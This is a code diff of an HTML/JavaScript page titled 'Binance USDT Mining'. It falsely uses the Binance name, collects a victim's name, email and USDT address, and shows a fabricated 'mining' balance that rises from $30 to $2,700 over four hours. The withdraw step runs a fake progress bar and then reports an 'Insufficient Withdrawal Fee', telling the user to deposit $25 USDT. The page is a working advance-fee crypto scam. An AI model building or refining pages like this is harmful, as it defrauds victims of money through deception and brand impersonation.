@@ -4,150 +4,455 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>USDT Mining Dashboard</title>
+  <link href="https://fonts.googleapis.com/css?family=Inter:400,700&display=swap" rel="stylesheet">
   <style>
     body {
       margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #0b0f1a;
-      color: #fff;
+      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
+      background: linear-gradient(135deg, #090d1a 0%, #141a2e 100%);
+      color: #f4f4f4;
+      min-height: 100vh;
     }
-
     .container {
-      max-width: 400px;
+      max-width: 420px;
       margin: 60px auto;
-      padding: 20px;
-      background-color: #131722;
-      border-radius: 12px;
-      box-shadow: 0 0 20px rgba(255, 255, 255, 0.05);
+      padding: 28px 24px 24px 24px;
+      background: rgba(24, 28, 44, 0.99);
+      border-radius: 14px;
+      box-shadow: 0 6px 32px 0 rgba(0,0,0,0.2), 0 1.5px 12px 0 rgba(240,185,11,0.04);
+      position: relative;
     }
-
-    h2 {
+    h2, h3 {
+      margin: 0;
       text-align: center;
       color: #f0b90b;
+      font-weight: 700;
+      letter-spacing: 0.5px;
     }
-
+    label {
+      font-size: 0.98em;
+      color: #cfcfcf;
+      margin-bottom: 3px;
+      display: block;
+    }
     input, select, button {
       width: 100%;
-      padding: 12px;
-      margin: 10px 0;
+      padding: 13px;
+      margin: 8px 0 16px 0;
       border: none;
-      border-radius: 6px;
-      font-size: 1em;
+      border-radius: 7px;
+      font-size: 1.05em;
+      font-family: inherit;
+      outline: none;
+      box-sizing: border-box;
+      transition: background 0.2s;
     }
-
     input, select {
-      background-color: #1e2633;
-      color: #fff;
+      background: #181c2c;
+      color: #f4f4f4;
     }
-
+    input:focus, select:focus {
+      background: #21253e;
+    }
     button {
-      background-color: #f0b90b;
-      color: #000;
-      font-weight: bold;
+      background: linear-gradient(90deg, #f0b90b 0%, #f8d03d 100%);
+      color: #181c2c;
+      font-weight: 700;
+      letter-spacing: 1px;
+      margin-top: 10px;
+      margin-bottom: 0;
       cursor: pointer;
+      box-shadow: 0 4px 18px rgba(240,185,11,0.10);
+      transition: background 0.2s, color 0.2s;
     }
-
     button:disabled {
-      background-color: #999;
+      background: #a1a1a1;
+      color: #444;
       cursor: not-allowed;
     }
-
     .balance {
-      font-size: 2em;
+      font-size: 2.1em;
       text-align: center;
-      margin: 20px 0;
+      margin: 18px 0 10px 0;
       color: #00ffcc;
+      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
+      font-weight: 700;
+      letter-spacing: 0.4px;
     }
-
+    .sub {
+      text-align: center;
+      font-size: 0.95em;
+      color: #bdbdbd;
+      margin-bottom: 18px;
+    }
+    .greeting {
+      font-size: 1.13em;
+      color: #f0b90b;
+      text-align: center;
+      margin-top: 12px;
+      margin-bottom: 12px;
+      font-weight: 600;
+    }
+    .row {
+      display: flex;
+      justify-content: space-between;
+      gap: 12px;
+    }
     .hidden {
-      display: none;
+      display: none !important;
+    }
+    /* Modal styles */
+    .modal-bg {
+      position: fixed;
+      top: 0; left: 0; width: 100vw; height: 100vh;
+      background: rgba(16, 18, 28, 0.88);
+      z-index: 99;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      transition: opacity 0.2s;
+    }
+    .modal {
+      background: #181c2c;
+      border-radius: 12px;
+      padding: 34px 25px 28px 25px;
+      box-shadow: 0 2px 28px rgba(240,185,11,0.11);
+      max-width: 350px;
+      width: 94vw;
+      text-align: center;
+      color: #fff;
+      position: relative;
+      font-size: 1em;
+      animation: pop-in 0.18s cubic-bezier(.5,-0.2,.6,1.6);
+    }
+    @keyframes pop-in {
+      0% {transform: scale(0.87);}
+      100% {transform: scale(1);}
+    }
+    .modal h3 {
+      color: #f0b90b;
+      margin-bottom: 16px;
+      font-size: 1.17em;
+    }
+    .modal .usdt-addr {
+      font-family: monospace;
+      font-size: 1.08em;
+      word-break: break-all;
+      background: #232849;
+      display: inline-block;
+      padding: 6px 12px;
+      border-radius: 7px;
+      margin-bottom: 12px;
+      color: #00ffcc;
+      letter-spacing: 0.3px;
+    }
+    .modal .loading-bar {
+      width: 98%;
+      background: #232849;
+      border-radius: 7px;
+      height: 18px;
+      margin: 18px auto 18px auto;
+      overflow: hidden;
+      position: relative;
+    }
+    .modal .loading-inner {
+      background: linear-gradient(90deg, #f0b90b 0%, #f8d03d 100%);
+      height: 100%;
+      width: 1%;
+      border-radius: 7px 0 0 7px;
+      transition: width 0.18s;
+    }
+    .modal .close-btn {
+      background: none;
+      color: #f0b90b;
+      border: none;
+      font-size: 1.13em;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 10px;
+      padding: 0 10px;
+    }
+    .modal .error-msg {
+      color: #ff4566;
+      font-size: 1.08em;
+      margin-top: 18px;
+      font-weight: 600;
+    }
+    @media (max-width: 540px) {
+      .container {margin: 10vw 1vw; padding: 5vw 2vw;}
     }
   </style>
 </head>
 <body>
+  <!-- Registration Form -->
   <div class="container" id="registration">
-    <h2>Register</h2>
+    <h2>Binance USDT Mining</h2>
+    <div class="sub">Create your wallet to start mining USDT instantly</div>
+    <label for="country">Country</label>
     <select id="country">
       <option value="">Select Country</option>
-      <option value="USA">USA</option>
-      <option value="UK">UK</option>
-      <option value="Nigeria">Nigeria</option>
-      <!-- Add more countries -->
+      <option>India</option>
+      <option>USA</option>
+      <option>UK</option>
+      <option>Canada</option>
+      <option>Germany</option>
+      <option>France</option>
+      <option>Italy</option>
+      <option>Spain</option>
+      <option>Australia</option>
+      <option>Brazil</option>
+      <option>Japan</option>
+      <option>China</option>
+      <option>Russia</option>
+      <option>South Africa</option>
+      <option>Egypt</option>
+      <option>Mexico</option>
+      <option>Saudi Arabia</option>
+      <option>Argentina</option>
+      <option>Turkey</option>
+      <option>South Korea</option>
+      <option>Singapore</option>
+      <option>Thailand</option>
+      <option>Netherlands</option>
+      <option>Sweden</option>
+      <option>Switzerland</option>
+      <option>Poland</option>
+      <option>Austria</option>
+      <option>UAE</option>
+      <option>Malaysia</option>
+      <option>Indonesia</option>
+      <!-- 30 countries -->
     </select>
-    <input type="text" id="name" placeholder="Full Name" />
-    <input type="text" id="usdt" placeholder="USDT Address" />
-    <input type="email" id="email" placeholder="Email Address" />
-    <button onclick="register()">Submit</button>
+    <label for="name">Full Name</label>
+    <input type="text" id="name" placeholder="Full Name" autocomplete="off"/>
+    <label for="usdt">USDT Address</label>
+    <input type="text" id="usdt" placeholder="USDT Address" autocomplete="off"/>
+    <label for="email">Email Address</label>
+    <input type="email" id="email" placeholder="Email Address" autocomplete="off"/>
+    <button onclick="register()">Register</button>
   </div>
 
+  <!-- Dashboard -->
   <div class="container hidden" id="dashboard">
+    <div class="greeting" id="greeting"></div>
     <h2>Mining Dashboard</h2>
+    <div class="sub">Your Binance Wallet is mining USDT</div>
     <div class="balance" id="balance">$30.00 USDT</div>
-    <button id="startBtn" onclick="startMining()">Start Mining</button>
-    <button id="withdrawBtn" disabled>Withdraw</button>
+    <div class="row">
+      <button id="startBtn" onclick="startMining()">Start Mining</button>
+      <button id="withdrawBtn" disabled onclick="openWithdraw()">Withdraw</button>
+    </div>
+  </div>
+
+  <!-- Modal -->
+  <div class="modal-bg hidden" id="modalBg">
+    <div class="modal" id="modalContent">
+      <!-- Dynamic Content -->
+    </div>
   </div>
 
   <script>
+    // --- Constants ---
+    const MINING_START_BALANCE = 30;
+    const MINING_TARGET_BALANCE = 2700;
+    const MINING_DURATION_MS = 4 * 60 * 60 * 1000; // 4 hours
+    // For test: set to 30sec: const MINING_DURATION_MS = 30000;
+
+    // --- DOM Elements ---
     const registrationDiv = document.getElementById('registration');
     const dashboardDiv = document.getElementById('dashboard');
     const balanceDisplay = document.getElementById('balance');
     const withdrawBtn = document.getElementById('withdrawBtn');
+    const startBtn = document.getElementById('startBtn');
+    const greetingDiv = document.getElementById('greeting');
+    const modalBg = document.getElementById('modalBg');
+    const modalContent = document.getElementById('modalContent');
 
-    let balance = 30;
+    // --- State ---
     let miningStarted = false;
-    let startTime;
+    let miningFinished = false;
+    let miningInterval;
+    let miningStartTime = null;
+    let miningEndTime = null;
+    let balance = MINING_START_BALANCE;
+    let user = {};
 
-    // Check if user is already registered
-    if (localStorage.getItem('registered')) {
-      registrationDiv.classList.add('hidden');
-      dashboardDiv.classList.remove('hidden');
-      balance = parseFloat(localStorage.getItem('balance')) || 30;
-      updateBalance();
+    // --- Utility Functions ---
+    function saveUserState() {
+      localStorage.setItem('registered', '1');
+      localStorage.setItem('user', JSON.stringify(user));
+    }
+    function saveMiningState() {
+      localStorage.setItem('miningStarted', miningStarted ? '1' : '');
+      localStorage.setItem('miningStartTime', miningStartTime || '');
+      localStorage.setItem('miningEndTime', miningEndTime || '');
+      localStorage.setItem('balance', balance.toFixed(2));
+    }
+    function loadUserState() {
+      if (localStorage.getItem('registered')) {
+        const u = JSON.parse(localStorage.getItem('user') || '{}');
+        user = u;
+        return true;
+      }
+      return false;
+    }
+    function loadMiningState() {
+      miningStarted = !!localStorage.getItem('miningStarted');
+      miningStartTime = localStorage.getItem('miningStartTime') ? parseInt(localStorage.getItem('miningStartTime')) : null;
+      miningEndTime = localStorage.getItem('miningEndTime') ? parseInt(localStorage.getItem('miningEndTime')) : null;
+      balance = localStorage.getItem('balance') ? parseFloat(localStorage.getItem('balance')) : MINING_START_BALANCE;
+    }
+    function resetMiningState() {
+      miningStarted = false;
+      miningFinished = false;
+      miningStartTime = null;
+      miningEndTime = null;
+      balance = MINING_START_BALANCE;
+      localStorage.removeItem('miningStarted');
+      localStorage.removeItem('miningStartTime');
+      localStorage.removeItem('miningEndTime');
+      localStorage.setItem('balance', balance.toFixed(2));
     }
 
+    // --- UI Functions ---
+    function showDashboard() {
+      registrationDiv.classList.add('hidden');
+      dashboardDiv.classList.remove('hidden');
+      greetingDiv.textContent = user.name ? `Hi, ${user.name}! Welcome to your Binance Wallet.` : '';
+    }
+    function updateBalance() {
+      balanceDisplay.textContent = `$${balance.toFixed(2)} USDT`;
+    }
+    function checkMiningStatus() {
+      // Called on page load and interval
+      if (!miningStarted || !miningStartTime || !miningEndTime) {
+        withdrawBtn.disabled = true;
+        startBtn.disabled = false;
+        updateBalance();
+        return;
+      }
+      const now = Date.now();
+      if (now >= miningEndTime) {
+        miningFinished = true;
+        miningStarted = false;
+        balance = MINING_TARGET_BALANCE;
+        updateBalance();
+        withdrawBtn.disabled = false;
+        startBtn.disabled = true;
+        // Save final state
+        saveMiningState();
+        return;
+      }
+
+      const elapsed = now - miningStartTime;
+      const duration = miningEndTime - miningStartTime;
+      const progress = Math.min(elapsed / duration, 1);
+      balance = MINING_START_BALANCE + (MINING_TARGET_BALANCE - MINING_START_BALANCE) * progress;
+      updateBalance();
+      withdrawBtn.disabled = true;
+      startBtn.disabled = true;
+      // Save ongoing state
+      saveMiningState();
+    }
+
+    // --- Registration ---
     function register() {
-      const country = document.getElementById('country').value;
-      const name = document.getElementById('name').value;
-      const usdt = document.getElementById('usdt').value;
-      const email = document.getElementById('email').value;
+      const country = document.getElementById('country').value.trim();
+      const name = document.getElementById('name').value.trim();
+      const usdt = document.getElementById('usdt').value.trim();
+      const email = document.getElementById('email').value.trim();
 
       if (!country || !name || !usdt || !email) {
         alert("Please fill all fields.");
         return;
       }
-
-      localStorage.setItem('registered', true);
-      localStorage.setItem('balance', '30');
-      registrationDiv.classList.add('hidden');
-      dashboardDiv.classList.remove('hidden');
+      user = { country, name, usdt, email };
+      saveUserState();
+      resetMiningState();
+      showDashboard();
+      updateBalance();
+      checkMiningStatus();
     }
 
+    // --- Mining ---
     function startMining() {
       if (miningStarted) return;
       miningStarted = true;
-      startTime = Date.now();
-      document.getElementById('startBtn').disabled = true;
+      miningFinished = false;
+      miningStartTime = Date.now();
+      miningEndTime = miningStartTime + MINING_DURATION_MS;
+      saveMiningState();
+      checkMiningStatus();
+    }
 
-      const duration = 4 * 60 * 60 * 1000; // 4 hours in ms
-      const target = 2700;
-      const interval = setInterval(() => {
-        const elapsed = Date.now() - startTime;
-        if (elapsed >= duration) {
-          balance = target;
+    // --- Withdraw Flow ---
+    function openWithdraw() {
+      if (!miningFinished) return;
+      showModal(`
+        <h3>Confirm Withdraw</h3>
+        <div style="margin-bottom:10px;">You are about to withdraw:</div>
+        <div class="balance" style="margin:8px auto 8px auto;font-size:1.2em;">$${balance.toFixed(2)} USDT</div>
+        <div style="margin-bottom:6px;">To Address:</div>
+        <div class="usdt-addr">${user.usdt}</div>
+        <button onclick="confirmWithdraw()" style="margin-top:18px;">Confirm</button>
+        <button class="close-btn" onclick="closeModal()">Cancel</button>
+      `);
+    }
+    // Loading and error on confirm
+    function confirmWithdraw() {
+      let percent = 1;
+      showModal(`
+        <h3>Processing Transfer</h3>
+        <div class="loading-bar"><div class="loading-inner" id="loadingInner" style="width:1%"></div></div>
+        <div id="loadingPercent" style="color:#f0b90b;font-weight:600;">1%</div>
+      `);
+      let interval = setInterval(() => {
+        percent = Math.min(percent + Math.floor(Math.random()*5 + 2), 98);
+        document.getElementById('loadingInner').style.width = percent + '%';
+        document.getElementById('loadingPercent').textContent = percent + '%';
+        if (percent >= 98) {
           clearInterval(interval);
-          withdrawBtn.disabled = false;
-        } else {
-          const progress = elapsed / duration;
-          balance = 30 + (target - 30) * progress;
+          setTimeout(() => {
+            showModal(`
+              <h3>Withdrawal Error</h3>
+              <div class="error-msg">Insufficient Withdrawal Fee</div>
+              <div style="margin-top:12px; color:#fff;">$25 USDT needed for Withdraw acceptance.<br><br>
+              Please deposit $25 USDT to your wallet address and try again.</div>
+              <button class="close-btn" onclick="closeModal()">Close</button>
+            `);
+          }, 600);
         }
-        updateBalance();
-        localStorage.setItem('balance', balance.toFixed(2));
-      }, 1000);
+      }, 80 + Math.random()*90);
     }
 
-    function updateBalance() {
-      balanceDisplay.textContent = `$${balance.toFixed(2)} USDT`;
+    // --- Modal management ---
+    function showModal(contentHtml) {
+      modalContent.innerHTML = contentHtml;
+      modalBg.classList.remove('hidden');
     }
+    function closeModal() {
+      modalBg.classList.add('hidden');
+    }
+    window.confirmWithdraw = confirmWithdraw; // Expose to inline onclick
+
+    // --- On page load ---
+    function initApp() {
+      if (loadUserState()) {
+        showDashboard();
+        loadMiningState();
+        updateBalance();
+        checkMiningStatus();
+        // Poll mining every 800ms for UI update and persistence
+        setInterval(checkMiningStatus, 800);
+      }
+    }
+    initApp();
+
+    // --- Expose functions for HTML ---
+    window.register = register;
+    window.startMining = startMining;
+    window.openWithdraw = openWithdraw;
+    window.closeModal = closeModal;
   </script>
 </body>
 </html>
